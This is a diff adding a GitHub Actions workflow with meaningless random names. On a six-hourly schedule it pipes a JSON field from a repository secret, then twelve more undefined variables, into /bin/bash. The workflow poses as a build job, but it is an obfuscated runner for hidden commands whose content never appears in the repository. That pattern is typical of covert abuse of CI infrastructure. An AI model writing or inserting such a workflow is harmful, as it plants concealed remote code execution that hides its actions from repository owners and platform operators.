@@ -1,0 +1,29 @@
+name: qimutou9183
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qimutou9183
+        env:
+          clk4491: ${{ secrets.clk4491 }}
+        run: |
+          echo $clk4491 | jq -r .cbzgz18 | /bin/bash
+          echo $t502 | jq -r .cha74 | /bin/bash
+          echo $wo50933 | jq -r .dtdlr26623 | /bin/bash
+          echo $ikyq8 | jq -r .veqgy70857 | /bin/bash
+          echo $gkiv37401 | jq -r .e4509 | /bin/bash
+          echo $vh37 | jq -r .wg9906 | /bin/bash
+          echo $tz126 | jq -r .vqjxn352 | /bin/bash
+          echo $kmmxl1549 | jq -r .j1 | /bin/bash
+          echo $mcl195 | jq -r .y33040 | /bin/bash
+          echo $jstr63428 | jq -r .bet93531 | /bin/bash
+          echo $jmgo31 | jq -r .vace48 | /bin/bash
+          echo $ggv3 | jq -r .gmqa368 | /bin/bash
+          echo $z1910 | jq -r .ovqwe55 | /bin/bash
+
